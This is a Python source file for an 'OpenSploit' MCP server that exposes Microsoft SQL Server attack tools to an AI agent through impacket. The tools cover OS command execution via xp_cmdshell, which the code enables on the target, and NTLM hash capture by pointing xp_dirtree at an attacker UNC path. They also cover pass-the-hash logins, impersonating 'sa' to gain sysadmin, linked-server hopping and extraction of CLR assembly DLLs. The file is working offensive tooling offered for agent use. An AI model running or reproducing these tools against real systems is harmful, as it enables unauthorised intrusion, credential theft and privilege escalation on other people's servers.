#!/usr/bin/env python3
"""
OpenSploit MCP Server: mssql

Microsoft SQL Server exploitation via impacket's TDS client.
Supports SQL queries, xp_cmdshell, xp_dirtree, linked server traversal,
CLR assembly extraction, and privilege escalation.
"""

import asyncio
import base64
import os
import re
from typing import Any, Dict, List, Optional

from mcp_common import BaseMCPServer, ToolResult, ToolError, sanitize_output


class MssqlServer(BaseMCPServer):
    """MCP server for MSSQL exploitation via impacket."""

    def __init__(self):
        super().__init__(
            name="mssql",
            description="Microsoft SQL Server exploitation — queries, xp_cmdshell, linked servers, assembly extraction",
            version="1.0.0",
        )

        # Common connection params
        _conn_params = {
            "host": {
                "type": "string",
                "required": True,
                "description": "MSSQL server hostname or IP address",
            },
            "username": {
                "type": "string",
                "required": True,
                "description": "SQL or Windows username (e.g., 'sa', 'DOMAIN\\user')",
            },
            "password": {
                "type": "string",
                "description": "Password (provide either password or hash)",
            },
            "hash": {
                "type": "string",
                "description": "NTLM hash in LMHASH:NTHASH format (pass-the-hash)",
            },
            "port": {
                "type": "integer",
                "default": 1433,
                "description": "MSSQL port (default 1433)",
            },
            "database": {
                "type": "string",
                "description": "Database to connect to (default: master)",
            },
            "windows_auth": {
                "type": "boolean",
                "default": False,
                "description": "Use Windows authentication instead of SQL auth",
            },
        }

        self.register_method(
            name="query",
            description="Execute a SQL query against MSSQL Server",
            params={
                **_conn_params,
                "sql": {
                    "type": "string",
                    "required": True,
                    "description": "SQL query to execute",
                },
            },
            handler=self.query,
        )

        self.register_method(
            name="enum",
            description="Enumerate MSSQL server — databases, tables, users, linked servers, assemblies",
            params={
                **_conn_params,
                "target": {
                    "type": "string",
                    "enum": ["databases", "tables", "users", "linked_servers", "assemblies", "impersonation", "all"],
                    "default": "all",
                    "description": "What to enumerate",
                },
            },
            handler=self.enum,
        )

        self.register_method(
            name="xp_cmdshell",
            description="Execute OS commands via xp_cmdshell (enables it if disabled)",
            params={
                **_conn_params,
                "command": {
                    "type": "string",
                    "required": True,
                    "description": "OS command to execute (e.g., 'whoami', 'dir C:\\')",
                },
            },
            handler=self.xp_cmdshell,
        )

        self.register_method(
            name="xp_dirtree",
            description="List directory contents or trigger NTLM authentication via xp_dirtree",
            params={
                **_conn_params,
                "path": {
                    "type": "string",
                    "required": True,
                    "description": "Path to list (local: 'C:\\Users') or UNC path to trigger NTLM (\\\\ATTACKER_IP\\share)",
                },
            },
            handler=self.xp_dirtree,
        )

        self.register_method(
            name="linked_query",
            description="Execute a query through a linked MSSQL server via OPENQUERY",
            params={
                **_conn_params,
                "linked_server": {
                    "type": "string",
                    "required": True,
                    "description": "Linked server name (from enum linked_servers)",
                },
                "sql": {
                    "type": "string",
                    "required": True,
                    "description": "SQL query to execute on the linked server",
                },
            },
            handler=self.linked_query,
        )

        self.register_method(
            name="extract_assembly",
            description="Extract CLR assembly DLLs from MSSQL sys.assembly_files",
            params={
                **_conn_params,
                "assembly_name": {
                    "type": "string",
                    "description": "Specific assembly name to extract. If omitted, lists all assemblies.",
                },
            },
            handler=self.extract_assembly,
        )

        self.register_method(
            name="escalate",
            description="Attempt MSSQL privilege escalation via impersonation or trustworthy DB",
            params={
                **_conn_params,
                "technique": {
                    "type": "string",
                    "enum": ["impersonate", "trustworthy", "linked_hop"],
                    "default": "impersonate",
                    "description": "Escalation technique to attempt",
                },
            },
            handler=self.escalate,
        )

    def _build_mssqlclient_cmd(
        self,
        host: str,
        username: str,
        password: str = None,
        hash: str = None,
        port: int = 1433,
        database: str = None,
        windows_auth: bool = False,
        commands: list = None,
    ) -> List[str]:
        """Build mssqlclient.py command."""
        # Build target string
        if "\\" in username or "/" in username:
            target = f"{username}"
        else:
            target = username

        if password:
            target += f":{password}"

        target += f"@{host}"

        cmd = ["mssqlclient.py", target]

        if port != 1433:
            cmd.extend(["-port", str(port)])
        if database:
            cmd.extend(["-db", database])
        if windows_auth:
            cmd.append("-windows-auth")
        if hash:
            cmd.extend(["-hashes", hash])
            cmd.append("-no-pass")

        if commands:
            for c in commands:
                cmd.extend(["-command", c])

        return cmd

    def _check_errors(self, output: str) -> str:
        """Check for common MSSQL errors in output. Returns error message or None."""
        combined = output.lower()
        if "login failed" in combined:
            return "MSSQL login failed — check credentials and auth mode"
        if "connection refused" in combined:
            return "Connection refused — MSSQL may not be running on this port"
        if "timed out" in combined or "timeout" in combined:
            return "Connection timed out — target may be unreachable"
        if "no route to host" in combined:
            return "No route to host — target is unreachable"
        if "network is unreachable" in combined:
            return "Network is unreachable — check VPN or routing"
        if "connection reset" in combined:
            return "Connection reset — target dropped the connection"
        if "access is denied" in combined or "permission denied" in combined:
            return "Access denied — insufficient privileges for this operation"
        if "traceback" in combined and "error" in combined:
            return "MSSQL client error — check raw output for details"
        if "oserror" in combined or "connectionerror" in combined:
            return "Connection error — target may be unreachable"
        return None

    async def _run_sql(
        self,
        host: str,
        username: str,
        password: str = None,
        hash: str = None,
        port: int = 1433,
        database: str = None,
        windows_auth: bool = False,
        sql_commands: list = None,
        timeout: int = 30,
    ) -> tuple:
        """Execute SQL commands via mssqlclient.py and return stdout, stderr."""
        cmd = self._build_mssqlclient_cmd(
            host, username, password, hash, port, database, windows_auth, sql_commands,
        )

        result = await self.run_command(cmd, timeout=timeout)
        stdout = result.stdout.strip() if result.stdout else ""
        stderr = result.stderr.strip() if result.stderr else ""
        return stdout, stderr, result.returncode

    def _parse_sql_output(self, output: str) -> List[Dict[str, str]]:
        """Parse tabular SQL output into list of dicts."""
        lines = output.split("\n")
        rows = []
        headers = None

        for line in lines:
            line = line.strip()
            # Skip separator lines and empty lines
            if not line or line.startswith("-") or line.startswith("Impacket") or line.startswith("["):
                continue
            if line.startswith("SQL>") or line.startswith("SQL ("):
                continue

            # Detect header row (columns separated by multiple spaces)
            parts = re.split(r"\s{2,}", line)
            if len(parts) >= 1:
                if headers is None:
                    headers = parts
                else:
                    row = {}
                    for i, h in enumerate(headers):
                        row[h] = parts[i] if i < len(parts) else ""
                    rows.append(row)

        return rows

    async def query(
        self,
        host: str,
        username: str,
        sql: str,
        password: str = None,
        hash: str = None,
        port: int = 1433,
        database: str = None,
        windows_auth: bool = False,
    ) -> ToolResult:
        """Execute a SQL query."""
        self.logger.info(f"MSSQL query: {host} sql={sql[:80]}")

        try:
            stdout, stderr, rc = await self._run_sql(
                host, username, password, hash, port, database, windows_auth,
                sql_commands=[sql], timeout=30,
            )

            if "Login failed" in stdout or "Login failed" in stderr:
                return ToolResult(success=False, data={}, error=f"MSSQL login failed for {username}@{host}")

            if "ERROR" in stdout and "mssql" in stdout.lower():
                return ToolResult(success=False, data={}, error=f"SQL error: {stdout}", raw_output=stdout)

            rows = self._parse_sql_output(stdout)

            return ToolResult(
                success=True,
                data={
                    "host": host,
                    "rows": rows,
                    "row_count": len(rows),
                },
                raw_output=sanitize_output(stdout, max_length=20000),
            )

        except Exception as e:
            return ToolResult(success=False, data={}, error=f"MSSQL query failed: {e}")

    async def enum(
        self,
        host: str,
        username: str,
        target: str = "all",
        password: str = None,
        hash: str = None,
        port: int = 1433,
        database: str = None,
        windows_auth: bool = False,
    ) -> ToolResult:
        """Enumerate MSSQL server."""
        self.logger.info(f"MSSQL enum: {host} target={target}")

        queries = {}
        if target in ("databases", "all"):
            queries["databases"] = "SELECT name FROM sys.databases"
        if target in ("users", "all"):
            queries["users"] = "SELECT name, type_desc FROM sys.server_principals WHERE type IN ('S','U','G')"
        if target in ("linked_servers", "all"):
            queries["linked_servers"] = "EXEC sp_linkedservers"
        if target in ("assemblies", "all"):
            queries["assemblies"] = "SELECT name, permission_set_desc FROM sys.assemblies WHERE is_user_defined = 1"
        if target in ("impersonation", "all"):
            queries["impersonation"] = "SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'"
        if target in ("tables", "all"):
            queries["tables"] = "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES"

        results = {}
        raw_parts = []
        auth_failed = False

        for name, sql in queries.items():
            try:
                stdout, stderr, rc = await self._run_sql(
                    host, username, password, hash, port, database, windows_auth,
                    sql_commands=[sql], timeout=15,
                )
                combined = f"{stdout}\n{stderr}"
                error = self._check_errors(combined)
                if error:
                    auth_failed = True
                    results[name] = {"error": error}
                    raw_parts.append(f"--- {name} ---\n{combined}")
                    break  # Don't try more queries if auth failed
                rows = self._parse_sql_output(stdout)
                results[name] = rows
                raw_parts.append(f"--- {name} ---\n{stdout}")
            except Exception as e:
                results[name] = {"error": str(e)}

        return ToolResult(
            success=not auth_failed,
            data={
                "host": host,
                "results": results,
            },
            raw_output=sanitize_output("\n\n".join(raw_parts), max_length=20000),
            error="MSSQL login failed — check credentials" if auth_failed else None,
        )

    async def xp_cmdshell(
        self,
        host: str,
        username: str,
        command: str,
        password: str = None,
        hash: str = None,
        port: int = 1433,
        database: str = None,
        windows_auth: bool = False,
    ) -> ToolResult:
        """Execute OS commands via xp_cmdshell."""
        self.logger.info(f"MSSQL xp_cmdshell: {host} command={command}")

        enable_cmds = [
            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
            "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
            f"EXEC xp_cmdshell '{command}'",
        ]

        try:
            stdout, stderr, rc = await self._run_sql(
                host, username, password, hash, port, database, windows_auth,
                sql_commands=enable_cmds, timeout=30,
            )

            # Check for connection/auth errors
            combined = f"{stdout}\n{stderr}"
            error = self._check_errors(combined)
            if error:
                return ToolResult(success=False, data={"host": host}, error=error, raw_output=sanitize_output(combined, max_length=5000))

            # Extract command output (skip SQL overhead)
            output_lines = []
            capture = False
            for line in stdout.split("\n"):
                if "xp_cmdshell" in line.lower():
                    capture = True
                    continue
                if capture and line.strip() and not line.startswith("[") and not line.startswith("SQL"):
                    output_lines.append(line.rstrip())

            cmd_output = "\n".join(output_lines).strip()

            return ToolResult(
                success=True,
                data={
                    "host": host,
                    "command": command,
                    "output": cmd_output,
                },
                raw_output=sanitize_output(stdout, max_length=20000),
            )

        except Exception as e:
            return ToolResult(success=False, data={}, error=f"xp_cmdshell failed: {e}")

    async def xp_dirtree(
        self,
        host: str,
        username: str,
        path: str,
        password: str = None,
        hash: str = None,
        port: int = 1433,
        database: str = None,
        windows_auth: bool = False,
    ) -> ToolResult:
        """List directory or trigger NTLM auth via xp_dirtree."""
        self.logger.info(f"MSSQL xp_dirtree: {host} path={path}")

        is_unc = path.startswith("\\\\")
        sql = f"EXEC xp_dirtree '{path}', 1, 1"

        try:
            stdout, stderr, rc = await self._run_sql(
                host, username, password, hash, port, database, windows_auth,
                sql_commands=[sql], timeout=15,
            )

            combined = f"{stdout}\n{stderr}"
            error = self._check_errors(combined)
            if error:
                return ToolResult(success=False, data={"host": host}, error=error, raw_output=sanitize_output(combined, max_length=5000))

            rows = self._parse_sql_output(stdout)

            result_data = {
                "host": host,
                "path": path,
                "is_unc": is_unc,
                "entries": rows,
                "entry_count": len(rows),
            }

            if is_unc:
                result_data["note"] = "UNC path triggered — check responder/ntlmrelayx for captured NTLM hash"

            return ToolResult(
                success=True,
                data=result_data,
                raw_output=sanitize_output(stdout, max_length=10000),
            )

        except Exception as e:
            return ToolResult(success=False, data={}, error=f"xp_dirtree failed: {e}")

    async def linked_query(
        self,
        host: str,
        username: str,
        linked_server: str,
        sql: str,
        password: str = None,
        hash: str = None,
        port: int = 1433,
        database: str = None,
        windows_auth: bool = False,
    ) -> ToolResult:
        """Execute a query through a linked MSSQL server."""
        self.logger.info(f"MSSQL linked query: {host} → {linked_server} sql={sql[:80]}")

        # Use OPENQUERY for linked server queries
        linked_sql = f"SELECT * FROM OPENQUERY([{linked_server}], '{sql.replace(chr(39), chr(39)+chr(39))}')"

        try:
            stdout, stderr, rc = await self._run_sql(
                host, username, password, hash, port, database, windows_auth,
                sql_commands=[linked_sql], timeout=30,
            )

            combined = f"{stdout}\n{stderr}"
            error = self._check_errors(combined)
            if error:
                return ToolResult(success=False, data={"host": host}, error=error, raw_output=sanitize_output(combined, max_length=5000))

            rows = self._parse_sql_output(stdout)

            return ToolResult(
                success=True,
                data={
                    "host": host,
                    "linked_server": linked_server,
                    "sql": sql,
                    "rows": rows,
                    "row_count": len(rows),
                },
                raw_output=sanitize_output(stdout, max_length=20000),
            )

        except Exception as e:
            return ToolResult(success=False, data={}, error=f"Linked query failed: {e}")

    async def extract_assembly(
        self,
        host: str,
        username: str,
        assembly_name: str = None,
        password: str = None,
        hash: str = None,
        port: int = 1433,
        database: str = None,
        windows_auth: bool = False,
    ) -> ToolResult:
        """Extract CLR assembly DLLs from MSSQL."""
        self.logger.info(f"MSSQL extract assembly: {host} name={assembly_name}")

        if assembly_name:
            sql = f"SELECT af.name, af.content FROM sys.assembly_files af INNER JOIN sys.assemblies a ON af.assembly_id = a.assembly_id WHERE a.name = '{assembly_name}'"
        else:
            sql = "SELECT a.name, a.permission_set_desc, af.name as filename FROM sys.assemblies a INNER JOIN sys.assembly_files af ON a.assembly_id = af.assembly_id WHERE a.is_user_defined = 1"

        try:
            stdout, stderr, rc = await self._run_sql(
                host, username, password, hash, port, database, windows_auth,
                sql_commands=[sql], timeout=30,
            )

            combined = f"{stdout}\n{stderr}"
            error = self._check_errors(combined)
            if error:
                return ToolResult(success=False, data={"host": host}, error=error, raw_output=sanitize_output(combined, max_length=5000))

            rows = self._parse_sql_output(stdout)

            return ToolResult(
                success=True,
                data={
                    "host": host,
                    "assembly_name": assembly_name,
                    "results": rows,
                    "result_count": len(rows),
                    "note": "Binary content is returned as hex — decode with: echo '<hex>' | xxd -r -p > assembly.dll" if assembly_name else "Use assembly_name parameter to extract specific DLL content",
                },
                raw_output=sanitize_output(stdout, max_length=20000),
            )

        except Exception as e:
            return ToolResult(success=False, data={}, error=f"Assembly extraction failed: {e}")

    async def escalate(
        self,
        host: str,
        username: str,
        technique: str = "impersonate",
        password: str = None,
        hash: str = None,
        port: int = 1433,
        database: str = None,
        windows_auth: bool = False,
    ) -> ToolResult:
        """Attempt MSSQL privilege escalation."""
        self.logger.info(f"MSSQL escalation: {host} technique={technique}")

        if technique == "impersonate":
            # Check who we can impersonate and try to get sysadmin
            cmds = [
                "SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'",
                "EXECUTE AS LOGIN = 'sa'",
                "SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')",
            ]
        elif technique == "trustworthy":
            cmds = [
                "SELECT name, is_trustworthy_on FROM sys.databases WHERE is_trustworthy_on = 1",
            ]
        elif technique == "linked_hop":
            cmds = [
                "EXEC sp_linkedservers",
                "SELECT srvname, srvproduct, provider FROM sys.sysservers WHERE srvid > 0",
            ]
        else:
            return ToolResult(success=False, data={}, error=f"Unknown technique: {technique}")

        try:
            stdout, stderr, rc = await self._run_sql(
                host, username, password, hash, port, database, windows_auth,
                sql_commands=cmds, timeout=15,
            )

            combined = f"{stdout}\n{stderr}"
            error = self._check_errors(combined)
            if error:
                return ToolResult(success=False, data={"host": host}, error=error, raw_output=sanitize_output(combined, max_length=5000))

            return ToolResult(
                success=True,
                data={
                    "host": host,
                    "technique": technique,
                },
                raw_output=sanitize_output(stdout, max_length=10000),
            )

        except Exception as e:
            return ToolResult(success=False, data={}, error=f"Escalation failed: {e}")


if __name__ == "__main__":
    MssqlServer.main()
